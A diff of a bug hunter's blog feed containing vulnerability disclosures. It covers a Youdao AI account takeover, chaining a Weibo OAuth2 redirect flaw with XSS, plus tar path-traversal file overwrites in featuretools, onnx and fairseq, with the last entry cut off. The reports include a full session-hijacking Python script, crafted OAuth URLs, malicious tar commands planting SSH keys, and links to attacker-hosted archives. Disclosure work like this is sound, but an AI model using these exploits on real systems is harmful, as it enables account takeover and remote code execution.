@@ -1,4 +1,702 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-03-19T08:48:10+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/03/17/xss-drawio.html" rel="alternate" type="text/html" title="中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞" /><published>2024-03-17T10:26:18+08:00</published><updated>2024-03-17T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/03/17/xss-drawio</id><content type="html" xml:base="http://localhost:4000/xss/2024/03/17/xss-drawio.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-09T15:30:26+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)</title><link href="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html" rel="alternate" type="text/html" title="高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)" /><published>2024-04-09T10:26:18+08:00</published><updated>2024-04-09T10:26:18+08:00</updated><id>http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover</id><content type="html" xml:base="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>有道智云存在微博OAuth2登录缺陷, 串联XSS漏洞实现账户劫持(对业务影响小，忽略hh)</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>account takeover</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>High, 9.5</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+<ul>
+  <li>
+    <p>POC网页: <a href="https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###">https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###</a></p>
+  </li>
+  <li>
+    <p>视频链接：<a href="https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw">https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw</a> 提取码：1314</p>
+  </li>
+</ul>
+
+<h2 id="key-payload">Key Payload</h2>
+
+<p>OAuth2登录请求，其中code参数是攻击者截获的微博认证code：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /login-weibo-redirect.s?code=58590295c78da0b3f1141b7bdcb5bc4f HTTP/1.1
+Host: ai.youdao.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://api.weibo.com/
+Cookie: JSESSIONID_NEW=5f715da6-a7c5-4638-8401-4a7e64330d93
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+</code></pre></div></div>
+
+<h2 id="summary">Summary</h2>
+
+<p>网易有道智云平台的登录有几种认证方式，其中之一是微博的OAuth2登录：</p>
+
+<ol>
+  <li>用户选择微博登录后，会跳转到微博的登录认证界面，并要求用户扫码登录。但是该OAuth2没有state参数，仅有redirect参数，并且该参数的跳转链接为在任何youdao.com域名的链接。</li>
+  <li>当攻击者在youdao.com域名下找到xss漏洞后，攻击者能够设置redirect参数为xss漏洞页面，微博将code追加到xss链接之后，让攻击者通过xss读取该链接即可获取weibo token。</li>
+  <li>攻击者获取code后，通过code能够获取认证服务器返回的JSESSIONID_NEW cookie。通过该cookie能够登录受害者账户，实现账户劫持。</li>
+</ol>
+
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>
+    <p>首先利用先前找到的有道云协作markdown渲染XSS漏洞，该漏洞是markdown在渲染classDiagram类图时，未对node名称进行过滤，从而触发xss漏洞。并且markdown可以分享，例如分享xss链接为：<a href="https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225">https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225</a></p>
+
+    <p><img src="/assets/youdaoai/xiezuo.png" alt="xiezuo" /></p>
+
+    <p><img src="/assets/youdaoai/xiezuoxss.png" alt="xiezuoxss" /></p>
+  </li>
+  <li>
+    <p>受害者：注册网易有道智云平台账号，<a href="https://ai.youdao.com/login.s">https://ai.youdao.com/login.s</a>。并且进入账号设置，绑定微博账号。</p>
+
+    <p>登录和注册：</p>
+
+    <p><img src="/assets/youdaoai/register.png" alt="reg" /></p>
+
+    <p>微博绑定：</p>
+
+    <p><img src="/assets/youdaoai/weibo.png" alt="weibo" /></p>
+  </li>
+  <li>
+    <p>攻击者：打开通过微博登录链接，跳转到微博OAuth2验证界面，该界面提供二维码，用户通过微博app扫描即可登录。我们分析一下该验证界面的链接。</p>
+
+    <p>微博登录入口：</p>
+
+    <p><img src="/assets/youdaoai/weibodenglu.png" alt="weibod" /></p>
+
+    <p>微博扫码登录界面：</p>
+
+    <p><img src="/assets/youdaoai/weiboauth.png" alt="weiboa" /></p>
+
+    <p>分析微博验证界面的url链接：</p>
+
+    <p>https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fai.youdao.com%2Flogin-weibo-redirect.s&amp;forcelogin=true###</p>
+
+    <p>可以看到OAuth2的返回token是<code class="language-plaintext highlighter-rouge">code</code>类型，<code class="language-plaintext highlighter-rouge">redirect_uri</code>指向<code class="language-plaintext highlighter-rouge">https://ai.youdao.com/login-weibo-redirect.s</code>，未提供<code class="language-plaintext highlighter-rouge">state</code>参数，说明验证仅仅依靠code和跳转链接。只需要将跳转链接设置为攻击者控制的链接，就能够获取验证token。</p>
+  </li>
+  <li>
+    <p>笔者测试发现，redirect_uri仅仅验证了是否为youdao.com域名，子域名、路径等等都未验证，由此，攻击者只需要将该跳转链接设置为包含xss漏洞的链接即可截获token。</p>
+
+    <p>youdao.com域名下的xss漏洞链接：</p>
+
+    <p>https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225</p>
+
+    <p>将上述链接urlencode后替换redirect_uri值：</p>
+
+    <p>https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###</p>
+
+    <p>打开上述链接，并且将二维码发送给受害者，让其用微博扫描后：</p>
+
+    <p><img src="/assets/youdaoai/redirect.png" alt="re" /></p>
+
+    <p>跳转到攻击者控制的XSS页面，该xxs将发送code到远程服务器：</p>
+
+    <p><img src="/assets/youdaoai/weibotoken.png" alt="xss" /></p>
+
+    <p><img src="/assets/youdaoai/webhook2.png" alt="webhook" /></p>
+  </li>
+  <li>
+    <p>攻击者获取微博token后，分以下几个步骤获取受害者的session cookie,和jwt token:</p>
+
+    <p>第一步：将code发送后台服务器，get url为：https://ai.youdao.com/login-weibo-redirect.s?code=xxx ，服务器验证code合法后返回 <code class="language-plaintext highlighter-rouge">JSESSIONID_NEW</code> cookie作为session cookie。</p>
+
+    <p><img src="/assets/youdaoai/sessioncookie.png" alt="sess" /></p>
+
+    <p>第二步：将第一步的cookie设置到后续请求中，然后调用微博登录接口：post url为：https://ai.youdao.com/login-weibo.s</p>
+
+    <p><img src="/assets/youdaoai/loginweibo.png" alt="login" /></p>
+
+    <p>第三步：调用get url请求：https://ai.youdao.com/consoleApi/ABTest/checkUser ，获取jwt token。</p>
+
+    <p><img src="/assets/youdaoai/getjwt.png" alt="getjwt" /></p>
+
+    <p>第四步：获取受害者账户信息，调用post url请求：https://ai.youdao.com/consoleApi/user/getUserInfo ,成功返回信息。</p>
+
+    <p><img src="/assets/youdaoai/getuserinfo.png" alt="getuser" /></p>
+  </li>
+  <li>
+    <p>为自动化上述过程，笔者提供自动化脚本供测试：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> import requests
+ import sys
+
+ weiboCode= "weibo_code"
+ # 1. login-weibo-redirect.s
+ url = "https://ai.youdao.com/login-weibo-redirect.s?code="
+ payload = {}
+ headers = {
+ 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+ 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
+ 'Cookie':'f1194a72-cdcc-48ca-86bb-5d33f3ff667e'
+ }
+ response = requests.request("GET", url + weiboCode, headers=headers, data=payload)
+ cookies = response.headers['Set-Cookie']
+
+ JSESSIONID_NEW = None
+ if cookies:
+     cookie_strings = cookies.split(';')
+     for cookie_string in cookie_strings:
+         cookie_parts = cookie_string.strip().split('=')
+         if len(cookie_parts) == 2 and cookie_parts[0] == 'JSESSIONID_NEW':
+             JSESSIONID_NEW = cookie_parts[1]
+             print("Cookie Value:", JSESSIONID_NEW)
+             break
+
+ if not JSESSIONID_NEW:
+     print("no JSESSIONID_NEW found")
+     sys.exit()
+
+ print("################get JSESSIONID_NEW###############")
+ print(JSESSIONID_NEW)
+
+
+ # 2. login-weibo.s 
+ url = "https://ai.youdao.com/login-weibo.s"
+
+ payload = {}
+ headers = {
+ 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+ 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
+ 'Cookie':'JSESSIONID_NEW='+JSESSIONID_NEW+'; csrfToken=e9f3e7f6',
+ 'Origin': 'https://ai.youdao.com',
+ 'Sec-Fetch-Site': 'same-origin'
+ }
+ response = requests.request("POST", url, headers=headers, data=payload)
+
+ # /consoleApi/ABTest/checkUser
+ url = "https://ai.youdao.com/consoleApi/ABTest/checkUser"
+ payload = {}
+ response = requests.request("GET", url, headers=headers, data=payload)
+ Authorization = response.headers['Authorization']
+ print("################Authorization###############")
+ print(Authorization)
+
+ # /consoleApi/user/getUserInfo
+ url = "https://ai.youdao.com/consoleApi/user/getUserInfo"
+ payload = {}
+ response = requests.request("POST", url, headers=headers, data=payload)
+ print("################getUserInfo###############")
+ print(response.text)
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频</p>
+
+<p>链接：<a href="https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw">https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw</a>
+提取码：1314</p>
+
+<h2 id="impact">Impact</h2>
+
+<p>该漏洞影响所有绑定了微博账户的有道智云用户，只要受害者用微博扫描攻击者发送的二维码，即可实现有道智云账户的劫持攻击。</p>
+
+<h2 id="patch-advice">Patch advice</h2>
+
+<ol>
+  <li>对微博OAuth2设置state参数，并且限定redirect url。</li>
+</ol>]]></content><author><name></name></author><category term="account-takeover" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Huntr: Arbitrary File Overwrite in read_entityset api</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx-copy.html" rel="alternate" type="text/html" title="Huntr: Arbitrary File Overwrite in read_entityset api" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx%20copy</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx-copy.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Huntr: Arbitrary File Overwrite in read_entityset api in featuretools</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The <a href="https://featuretools.alteryx.com/en/stable/generated/featuretools.read_entityset.html#featuretools.read_entityset">featuretools.read_entityset</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>
+
+<p>The vulnerable function is exposed through the <code class="language-plaintext highlighter-rouge">featuretools.read_entityset</code> function, which can be imported easily. It’s an api used to read data_description.json from directory on disk, S3 path, or URL which is tar file.</p>
+
+<p>This code snippet shows how the <code class="language-plaintext highlighter-rouge">read_entityset</code> function extracts a tar file downloaded from internet without performing any security checks.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def read_entityset(path, profile_name=None, **kwargs):
+    """Read entityset from disk, S3 path, or URL.
+
+    Args:
+        path (str): Directory on disk, S3 path, or URL to read `data_description.json`.
+        profile_name (str, bool): The AWS profile specified to write to S3. Will default to None and search for AWS credentials.
+            Set to False to use an anonymous profile.
+        kwargs (keywords): Additional keyword arguments to pass as keyword arguments to the underlying deserialization method.
+    """
+    if _is_url(path) or _is_s3(path) or _is_local_tar(str(path)):
+        with tempfile.TemporaryDirectory() as tmpdir:
+            local_path = path
+            transport_params = None
+
+            if _is_s3(path):
+                transport_params = get_transport_params(profile_name)
+
+            if _is_s3(path) or _is_url(path):
+                local_path = os.path.join(tmpdir, "temporary_es")
+                use_smartopen_es(local_path, path, transport_params) # download file from url!
+            ### tar file extracted to tepdir without any security checks ###
+            with tarfile.open(str(local_path)) as tar:
+                tar.extractall(path=tmpdir)
+
+            data_description = read_data_description(tmpdir)
+            return description_to_entityset(data_description, **kwargs)
+    else:
+        data_description = read_data_description(path)
+        return description_to_entityset(data_description, **kwargs)
+</code></pre></div></div>
+
+<p>The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
+It is possible that files are created outside of path, 
+e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>An attacker can create a malicous tar file using following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys
+</code></pre></div></div>
+
+<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar</code> to public server.</p>
+
+<p>I have uploaded one malicous tar file for testing: <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar">https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar</a></p>
+
+<p>If anyone now downloads tar using <code class="language-plaintext highlighter-rouge">read_entityset</code> api, causing automatically extracting the malicous tar file and overwrite files silently.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import featuretools as ft
+ft.read_entityset(path="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar")
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/kali/.ssh/authorized_keys
+ssh-rsa xxx hacker@test.com
+</code></pre></div></div>
+
+<p>Tested on Google Colab: <a href="https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing">https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing</a></p>
+
+<p><img src="https://live.staticflickr.com/65535/53637853744_26b8a5fff7_h.jpg" alt="poc" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170">https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Huntr: Arbitrary File Overwrite in onnx</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx.html" rel="alternate" type="text/html" title="Huntr: Arbitrary File Overwrite in onnx" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Huntr: Arbitrary File Overwrite in onnx</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The <a href="https://onnx.ai/onnx/api/hub.html#download-model-with-test-data">download_model_with_test_data</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly leads to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>
+
+<p>The vulnerable function is exposed through the <code class="language-plaintext highlighter-rouge">download_model_with_test_data</code> function, which is further used in the onnx framework, as well as can be imported easily.</p>
+
+<p>This code snippet shows how the <code class="language-plaintext highlighter-rouge">download_model_with_test_data</code> function extracts a tar file downloaded from internet without performing any security checks.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def download_model_with_test_data(
+    model: str,
+    repo: str = "onnx/models:main", # change to attacker's repo
+    opset: Optional[int] = None,
+    force_reload: bool = False,
+    silent: bool = False, # set silent to True
+) -&gt; Optional[str]:
+    selected_model = get_model_info(model, repo, opset)
+
+    local_model_with_data_path_arr = selected_model.metadata[
+        "model_with_data_path"
+    ].split("/")
+
+    model_with_data_sha = selected_model.metadata["model_with_data_sha"]
+    ...
+    local_model_with_data_path = join(
+        _ONNX_HUB_DIR, os.sep.join(local_model_with_data_path_arr)
+    )
+
+    if force_reload or not os.path.exists(local_model_with_data_path):
+        os.makedirs(os.path.dirname(local_model_with_data_path), exist_ok=True)
+        lfs_url = _get_base_url(repo, True)
+        print(f"Downloading {model} to local path {local_model_with_data_path}")
+        _download_file( # download model from github repository
+            lfs_url + selected_model.metadata["model_with_data_path"],
+            local_model_with_data_path,
+        )
+    else:
+        print(f"Using cached {model} model from {local_model_with_data_path}")
+
+    with open(local_model_with_data_path, "rb") as f:
+        model_with_data_bytes = f.read()
+
+    with tarfile.open(local_model_with_data_path) as model_with_data_zipped:
+        # FIXME: Avoid index manipulation with magic numbers
+        local_model_with_data_dir_path = local_model_with_data_path[
+            0 : len(local_model_with_data_path) - 7
+        ]
+        model_with_data_zipped.extractall(local_model_with_data_dir_path) # just extract without any security checks
+
+    return model_with_data_path
+</code></pre></div></div>
+
+<p>The Python documentation explains us that tarfiles may also have absolute filenames starting with / which could overwite files in system.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
+It is possible that files are created outside of path, 
+e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>An attacker can create a malicous tar file using following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar.gz /home/kali/.ssh/authorized_keys
+</code></pre></div></div>
+
+<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar.gz</code> as onnx model to his own github repository. Besides, create file <code class="language-plaintext highlighter-rouge">ONNX_HUB_MANIFEST.json</code> with tar file path(<code class="language-plaintext highlighter-rouge">model_with_data_path</code>) and sha256 value(<code class="language-plaintext highlighter-rouge">model_with_data_sha</code>).</p>
+
+<p>Create malicious model repo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git lfs track "*.gz"
+git add .
+git commit -m 'add gz lfs models'
+git push
+</code></pre></div></div>
+
+<p>the <code class="language-plaintext highlighter-rouge">ONNX_HUB_MANIFEST.json</code> metadata file example:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[
+    {
+        "model": "MNIST",
+        "model_path": "validated/mnist-8.onnx",
+        "onnx_version": "1.3",
+        "opset_version": 8,
+        "metadata": {
+            "model_sha": "",
+            "model_bytes": 26454,
+            "tags": [
+                "vision",
+                "classification",
+                "mnist"
+            ],
+            "io_ports": {
+                "inputs": [
+                    {
+                        "name": "Input3",
+                        "shape": [
+                            1,
+                            1,
+                            28,
+                            28
+                        ],
+                        "type": "tensor(float)"
+                    }
+                ],
+                "outputs": [
+                    {
+                        "name": "Plus214_Output_0",
+                        "shape": [
+                            1,
+                            10
+                        ],
+                        "type": "tensor(float)"
+                    }
+                ]
+            },
+            "model_with_data_path": "validated/hack.tar.gz",
+            "model_with_data_sha": "786bb632aab30bb574f7f2bab991c56c7707f8d224845f85a16bce32e7980cac",
+            "model_with_data_bytes": 26751
+        }
+    }
+]
+</code></pre></div></div>
+<p>I have create one malicous repo for testing: <a href="https://github.com/sunriseXu/onnx">https://github.com/sunriseXu/onnx</a></p>
+
+<p>If anyone now downloads model from online github repository, and <code class="language-plaintext highlighter-rouge">download_model_with_test_data</code> will extract the malicous tar file and overwrite files specified in tarfile by absolute path silently.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from onnx import ModelProto, hub
+hub.download_model_with_test_data("mnist",repo="sunriseXu/onnx",force_reload=True,silent=True)
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/kali/.ssh/authorized_keys
+ssh-rsa xxx hacker@test.com
+</code></pre></div></div>
+
+<p>tested in google colab: <a href="https://colab.research.google.com/drive/1m1iJcfp-dETTr013HyYaYJsdetBa-7YA?usp=sharing">https://colab.research.google.com/drive/1m1iJcfp-dETTr013HyYaYJsdetBa-7YA?usp=sharing</a></p>
+
+<p><img src="https://raw.githubusercontent.com/sunriseXu/onnx/main/img/poc.png" alt="poc1" /></p>
+
+<p><img src="https://raw.githubusercontent.com/sunriseXu/onnx/main/img/poc2.png" alt="poc2" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<p>SSH Access
+On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<p>Web Servers
+On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369">https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Arbitrary File Overwrite in from_pretrained api in facebook fairseq</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The <a href="https://fairseq.readthedocs.io/en/latest/models.html?highlight=from_pretrained#fairseq.models.BaseFairseqModel.from_pretrained">from_pretrained</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>
+
+<p>The vulnerable function is exposed through the <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/models/fairseq_model.py#L272">BaseFairseqModel.from_pretrained</a> function. It’s an api used to read pretrained from files on disk, S3 path, or URL which is tar file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def from_pretrained(
+        cls,
+        model_name_or_path,
+        checkpoint_file="model.pt",
+        data_name_or_path=".",
+        **kwargs,
+    ):
+        from fairseq import hub_utils
+
+        x = hub_utils.from_pretrained(
+            model_name_or_path,
+            checkpoint_file,
+            data_name_or_path,
+            archive_map=cls.hub_models(),
+            **kwargs,
+        )
+        logger.info(x["args"])
+        return hub_utils.GeneratorHubInterface(x["args"], x["task"], x["models"])
+</code></pre></div></div>
+
+<p>and then it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/hub_utils.py#L23">hub_utils.from_pretrained</a>, in this function, it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L54">file_utils.load_archive_file</a> to download file from <code class="language-plaintext highlighter-rouge">model_name_or_path</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def from_pretrained(
+    model_name_or_path,
+    checkpoint_file="model.pt",
+    data_name_or_path=".",
+    archive_map=None,
+    **kwargs
+):
+    ...
+    model_path = file_utils.load_archive_file(model_name_or_path)
+</code></pre></div></div>
+
+<p>in <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>, it calls <code class="language-plaintext highlighter-rouge">file_utils.cached_path</code> firstly:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load_archive_file(archive_file):
+    # redirect to the cache, if necessary
+    try:
+        resolved_archive_file = cached_path(archive_file, cache_dir=None)
+    except EnvironmentError:
+        logger.info(
+            "Archive name '{}' was not found in archive name list. "
+            "We assumed '{}' was a path or URL but couldn't find any file "
+            "associated to this path or URL.".format(
+                archive_file,
+                archive_file,
+            )
+        )
+        return None
+
+    if resolved_archive_file == archive_file:
+        logger.info("loading archive file {}".format(archive_file))
+    else:
+        logger.info(
+            "loading archive file {} from cache at {}".format(
+                archive_file, resolved_archive_file
+            )
+        )
